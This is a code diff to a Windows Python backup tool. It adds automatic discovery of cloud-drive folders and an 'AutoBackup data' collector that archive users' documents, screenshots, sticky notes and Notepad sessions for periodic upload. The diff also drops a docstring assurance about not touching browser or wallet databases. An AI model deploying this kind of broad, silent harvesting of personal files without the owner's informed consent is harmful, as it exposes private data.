+        if not isinstance(data, dict):
+            continue
+        for account_name, label in (('personal', 'Dropbox Personal'),
+                                    ('business', 'Dropbox Business')):
+            account = data.get(account_name)
+            if isinstance(account, dict):
+                path = account.get('path')
+                if isinstance(path, str) and path:
+                    results.append((path, label))
+    return results
+
+
+def _volume_label(root_path):
+    if os.name != 'nt':
+        return ''
+    try:
+        import ctypes
+        buffer = ctypes.create_unicode_buffer(261)
+        ok = ctypes.windll.kernel32.GetVolumeInformationW(
+            ctypes.c_wchar_p(root_path), buffer, len(buffer), None, None, None, None, 0)
+        return buffer.value.strip() if ok else ''
+    except Exception:
+        return ''
+
+
+def _cloud_candidates_from_drives():
+    if os.name != 'nt':
+        return []
+    try:
+        import ctypes
+        drive_mask = ctypes.windll.kernel32.GetLogicalDrives()
+    except Exception:
+        return []
+    results = []
+    known_children = (
+        'My Drive', 'Google Drive', 'Google Drive File Stream',
+        'Dropbox', 'OneDrive', 'pCloud Drive', 'Box Drive', 'MEGA',
+    )
+    for index, letter in enumerate('ABCDEFGHIJKLMNOPQRSTUVWXYZ'):
+        if not drive_mask & (1 << index):
+            continue
+        root = f'{letter}:\\'
+        if not os.path.isdir(root):
+            continue
+        label = _volume_label(root)
+        if _matches_cloud_location(label):
+            results.append((root, label or f'{letter}: cloud drive'))
+        for name in known_children:
+            path = os.path.join(root, name)
+            if os.path.isdir(path):
+                results.append((path, name))
+    return results
+
+
+def _discover_cloud_directories(user_path):
+    candidates = []
+    for collect in (_cloud_candidates_from_environment,
+                    _cloud_candidates_from_onedrive_registry,
+                    _cloud_candidates_from_dropbox,
+                    lambda: _cloud_candidates_from_user_home(user_path),
+                    _cloud_candidates_from_drives):
+        try:
+            candidates.extend(collect())
+        except Exception:
+            DETAIL_LOGGER.exception('云盘目录自动检测失败')
+    return candidates
+
+
 def get_available_disks(config=None):
     """获取所有可用的磁盘和云盘目录"""
     config = config or BackupConfig()
@@ -1957,7 +2445,7 @@ def get_available_disks(config=None):
     user_prefix = username[:5] if username else "user"
     for letter in disk_letters:
         disk_path = f"{letter}:\\"  # 使用Windows路径格式
-        if os.path.exists(disk_path) and os.path.isdir(disk_path):
+        if is_disk_available(disk_path) and os.path.isdir(disk_path):
             backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_disk_{letter}')
             available_disks[letter] = {
                 'docs': (disk_path, os.path.join(backup_path, f'{user_prefix}_docs'), 1),  # 文档类
@@ -2003,6 +2491,7 @@ def get_available_disks(config=None):
                     # 检查文件夹名称是否包含云盘相关关键词
                     if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                         # 使用完整路径
+                        item = safe_label(item)
                         disk_key = f"cloud_{item.lower()}"
                         cloud_backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_cloud', item)
                         available_disks[disk_key] = {
@@ -2018,6 +2507,52 @@ def get_available_disks(config=None):
         except Exception as e:
             DETAIL_LOGGER.error(f"扫描用户云盘目录时出错: {e}")
     
+    normal_disk_roots = [os.path.abspath(f'{letter}:/') for letter in disk_letters
+                         if letter in available_disks]
+    existing_sources = {
+        os.path.normcase(os.path.realpath(os.path.abspath(source)))
+        for source_configs in available_disks.values()
+        for source, _target, _ext_type in source_configs.values()
+    }
+    seen_cloud = set()
+    try:
+        cloud_candidates = _discover_cloud_directories(user_path)
+    except Exception:
+        DETAIL_LOGGER.exception('扫描本地云盘目录时出错')
+        cloud_candidates = []
+    for item_path, item_name in cloud_candidates:
+        try:
+            candidate = os.path.abspath(os.path.expandvars(str(item_path)))
+        except (TypeError, ValueError):
+            continue
+        if not os.path.isdir(candidate):
+            continue
+        identity = os.path.normcase(os.path.realpath(candidate))
+        if identity in seen_cloud or identity in existing_sources:
+            continue
+        seen_cloud.add(identity)
+        if any(is_within(candidate, root, include_root=True) for root in normal_disk_roots):
+            DETAIL_LOGGER.debug('云盘目录已由磁盘扫描覆盖，跳过: %s', candidate)
+            continue
+        label = safe_label(str(item_name or os.path.basename(candidate)))
+        base_key = 'cloud_' + label.casefold()
+        disk_key = base_key
+        backup_label = label
+        suffix = 2
+        while disk_key in available_disks:
+            disk_key = f'{base_key}_{suffix}'
+            backup_label = f'{label}_{suffix}'
+            suffix += 1
+        cloud_backup_path = os.path.join(
+            config.BACKUP_ROOT, f'{user_prefix}_cloud', backup_label)
+        available_disks[disk_key] = {
+            'docs': (candidate, os.path.join(cloud_backup_path, f'{user_prefix}_docs'), 1),
+            'configs': (candidate, os.path.join(cloud_backup_path, f'{user_prefix}_configs'), 2),
+        }
+        DETAIL_LOGGER.info('检测到云盘目录: %s (%s)', candidate, item_name or label)
+        if config.DEBUG_MODE:
+            DETAIL_LOGGER.debug('云盘源目录: %s', candidate)
+            DETAIL_LOGGER.debug('云盘备份目录: %s', cloud_backup_path)
     return available_disks
 
 
@@ -2025,16 +2560,18 @@ def _finish_collection(backup_manager, result, label, batch, kind='backup'):
     batch.collections.append(result)
     display = task_label(label)
     if not result.complete:
-        DETAIL_LOGGER.error('%s | 未完成 | 已复制 %s 个文件 | 失败 %s 项 | 超时 %s | 保留副本: %s',
-                            display, len(result.files), len(result.errors),
+        DETAIL_LOGGER.error('%s | 未完成 | 已复制 %s 个文件 | 失败 %s 项 | 警告 %s 项 | 超时 %s | 保留副本: %s',
+                            display, len(result.files), len(result.errors), len(result.warnings),
                             '是' if result.timed_out else '否', result.directory)
         atomic_json(os.path.join(result.directory, 'collection-status.json'), {
-            'complete': False, 'errors': result.errors, 'files': result.files,
+            'complete': False, 'errors': result.errors, 'warnings': result.warnings,
+            'files': result.files,
             'timed_out': result.timed_out, 'skipped': result.skipped,
         })
         return
     if not result.files:
-        DETAIL_LOGGER.info('%s | 无符合条件的文件 | 跳过 %s 项', display, result.skipped)
+        DETAIL_LOGGER.info('%s | 无符合条件的文件 | 跳过 %s 项 | 警告 %s 项',
+                           display, result.skipped, len(result.warnings))
         backup_manager._clean_directory(result.directory)
         return
     try:
@@ -2044,16 +2581,15 @@ def _finish_collection(backup_manager, result, label, batch, kind='backup'):
         archive = backup_manager.zip_backup_folder(
             result.directory, backup_manager.new_artifact_base(label), result.files)
         backup_manager.enqueue_files(
-            archive.paths, kind=kind, file_records=result.fingerprints)
+            archive.paths, kind=kind, file_records=result.fingerprints,
+            redundant_archive=archive.redundant_archive)
         batch.paths.extend(archive.paths)
         # 清单持久化失败会在上面抛异常，此处不会删除唯一的本地副本。
         backup_manager._clean_directory(result.directory)
-        if archive.redundant_archive:
-            backup_manager._safe_remove_file(archive.redundant_archive)
         log_event(logging.INFO, '归档', 'archive_ready',
-                  '%s | 校验通过 | %s 个文件（%s） | 生成 %s 项待上传文件 | 跳过 %s 项 | 耗时 %s',
+                  '%s | 校验通过 | %s 个文件（%s） | 生成 %s 项待上传文件 | 跳过 %s 项 | 警告 %s 项 | 耗时 %s',
                   display, len(result.files), format_size(result.total_size), len(archive.paths),
-                  result.skipped, format_elapsed(archive_started), console=False)
+                  result.skipped, len(result.warnings), format_elapsed(archive_started), console=False)
     except Exception as exc:
         batch.errors.append(label + ': ' + str(exc))
         DETAIL_LOGGER.exception('归档准备失败，保留暂存副本: %s', result.directory)
@@ -2175,7 +2711,8 @@ def backup_sticky_notes(backup_manager, user_root=None):
     configured = getattr(backup_manager.config, 'STICKY_NOTES_RELATIVE_PATH', None)
     database = find_sticky_notes_database(user_root, configured)
     if not database:
-        result.errors.append('未找到 Windows 便签数据库 plum.sqlite')
+        result.skipped += 1
+        DETAIL_LOGGER.info('sticky notes database not found; skipped')
         return result
     if not is_within(database, user_root):
         result.errors.append('便签数据库必须位于当前用户目录: ' + database)
@@ -2336,6 +2873,26 @@ def backup_notepad_session(backup_manager, user_root=None):
     return result
 
 
+def backup_auto_backup_data(backup_manager):
+    """检查备份根目录下的 data 目录，并交给现有归档上传流程处理。"""
+    source = os.path.join(backup_manager.config.BACKUP_ROOT, 'data')
+    result = CollectionResult(backup_manager.new_staging_directory('wins_data'))
+    if not os.path.isdir(source):
+        result.skipped += 1
+        DETAIL_LOGGER.info('未发现 AutoBackup data 目录，跳过: %s', source)
+        return result
+
+    deadline = time.monotonic() + backup_manager.config.SCAN_TIMEOUT
+    try:
+        backup_manager._collect_tree(source, result, deadline, prefix='data',
+                                     allow_backup_root=True, best_effort=True)
+    except Exception as exc:
+        result.timed_out = isinstance(exc, TimeoutError)
+        result.errors.append(str(exc))
+        DETAIL_LOGGER.exception('AutoBackup data 目录收集失败: %s', source)
+    return result
+
+
 def backup_app_state(backup_manager):
     """按高频周期独立备份便签和记事本会话。"""
     batch = BackupBatch()
@@ -2354,11 +2911,12 @@ def backup_app_state(backup_manager):
 
 
 def backup_windows_data(backup_manager):
-    """备份截图和配置中指定的文件；不访问浏览器或钱包扩展数据库。"""
+    """备份截图、AutoBackup data 和配置中指定的文件。"""
     batch = BackupBatch()
     collectors = []
     collectors.extend((
         ('screenshots', lambda: backup_screenshots(backup_manager)),
+        ('wins_data', lambda: backup_auto_backup_data(backup_manager)),
         ('specified', lambda: backup_manager.backup_specified_files(
             os.path.expandvars('%USERPROFILE%'), backup_manager.new_staging_directory('specified'))),
     ))
@@ -2563,7 +3121,7 @@ def run_scheduled_iteration(backup_manager, now=None):
     if shutil.disk_usage(backup_manager.config.BACKUP_ROOT).free < backup_manager.config.MIN_FREE_SPACE:
         raise OSError('备份磁盘剩余空间低于 MIN_FREE_SPACE，保留已有文件并暂停新一轮收集')
     started = time.monotonic()
-    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、指定文件和截图')
+    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、指定文件、AutoBackup data 和截图')
     batch = backup_disks(backup_manager, get_available_disks(backup_manager.config))
     batch.extend(backup_windows_data(backup_manager))
     backup_manager.update_state(collection_complete=batch.complete, cycle_archives=len(batch.paths))
@@ -2628,13 +3186,33 @@ def periodic_backup_upload(backup_manager):
                 except Exception:
                     log_event(logging.ERROR, '状态', 'state_error',
                               '无法保存重试状态 | 本地备份保持原样，请检查详细日志', exc_info=True)
-            backup_manager.stop_event.wait(min(
-                backup_manager.config.BACKUP_CHECK_INTERVAL, backup_manager.config.ERROR_RETRY_DELAY))
+            wait_seconds = backup_manager.config.BACKUP_CHECK_INTERVAL
+            now = datetime.now()
+            with backup_manager._state_lock:
+                scheduled = (backup_manager.state.get('next_backup'),
+                             backup_manager.state.get('next_app_state_backup'),
+                             backup_manager.state.get('retry_after'),
+                             backup_manager.state.get('app_state_retry_after'))
+            for value in scheduled:
+                if not value:
+                    continue
+                try:
+                    remaining = (datetime.fromisoformat(value) - now).total_seconds()
+                except (TypeError, ValueError):
+                    continue
+                wait_seconds = min(wait_seconds, max(1.0, remaining))
+            backup_manager.stop_event.wait(wait_seconds)
     finally:
         backup_manager.stop_event.set()
+        join_deadline = time.monotonic() + max(
+            1, getattr(backup_manager.config, 'WORKER_JOIN_TIMEOUT', 10))
         for worker in workers:
-            while worker.is_alive():
-                worker.join(timeout=1)
+            remaining = join_deadline - time.monotonic()
+            if remaining > 0:
+                worker.join(timeout=remaining)
+            if worker.is_alive():
+                DETAIL_LOGGER.warning('worker did not stop before shutdown deadline: %s',
+                                      worker.name)
 
 
 def clean_backup_directory(config=None):
@@ -2645,14 +3223,15 @@ def clean_backup_directory(config=None):
 
 
 def main():
-    lock = SingleInstanceLock(BackupConfig.BACKUP_ROOT)
+    config = BackupConfig()
+    lock = SingleInstanceLock(config.BACKUP_ROOT)
     manager = None
     try:
         if not lock.acquire():
             print('备份程序已经在运行')
             return 0
         load_optional_dependencies()
-        manager = BackupManager()
+        manager = BackupManager(config)
         clean_backup_directory(manager.config)
         periodic_backup_upload(manager)
         return 0
